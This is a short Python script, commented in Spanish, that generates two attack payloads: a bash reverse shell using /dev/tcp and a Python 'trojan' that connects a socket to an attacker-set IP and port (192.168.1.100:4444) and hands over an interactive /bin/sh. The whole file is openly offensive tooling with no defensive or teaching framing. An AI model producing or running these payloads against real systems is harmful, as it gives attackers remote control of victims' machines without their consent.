import os

# Función para generar un payload de shell inversa
def generate_reverse_shell(ip, port):
    payload = f"""#!/bin/bash
/bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1
"""
    with open("reverse_shell.sh", "w") as f:
        f.write(payload)
    print("Payload de shell inversa generado: reverse_shell.sh")

# Función para generar un troyano básico en Python
def generate_trojan(ip, port):
    trojan_code = f"""import socket, subprocess, os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("{ip}", {port}))

os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

p = subprocess.call(["/bin/sh", "-i"])
"""
    with open("trojan.py", "w") as f:
        f.write(trojan_code)
    print("Troyano básico generado: trojan.py")

if __name__ == "__main__":
    # Configuración del IP y puerto del atacante
    attacker_ip = "192.168.1.100"
    attacker_port = 4444

    # Generar los payloads
    generate_reverse_shell(attacker_ip, attacker_port)
    generate_trojan(attacker_ip, attacker_port)

